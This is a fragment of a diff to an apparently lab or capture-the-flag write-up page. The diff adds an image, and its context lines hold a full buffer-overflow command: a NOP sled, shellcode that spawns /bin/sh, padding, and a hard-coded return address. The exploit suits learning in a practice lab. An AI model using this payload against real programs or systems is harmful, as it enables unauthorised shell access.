@@ -98,6 +98,14 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{213}}$$-day-streak in  <a href="h
 
 <pre><code>./buffer-overflow $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")</code></pre>
 
+<br>
+
+![image](https://github.com/user-attachments/assets/50fb5309-5fa8-4e08-84dc-bcaf7ac773a7)
+
+<br>
+
+
+
 
 
 <br>
